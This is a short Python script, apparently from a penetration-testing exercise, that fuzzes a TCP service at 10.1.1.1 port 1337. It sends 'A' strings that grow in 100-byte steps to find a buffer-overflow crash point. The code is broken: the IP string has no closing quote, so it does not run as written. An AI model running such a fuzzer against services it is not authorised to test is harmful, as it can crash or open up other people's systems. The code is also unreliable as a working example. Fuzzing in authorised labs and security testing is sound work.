# Change ip and port

import socket, time, sys

ip = "10.1.1.1
port = 1337
timeout = 5

# Set up connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip,port))

# Iterate fuzzing
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        print("Fuzzing with %s bytes" % len(string))
        s.send(string + "\r\n")
        s.recv(1024)
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
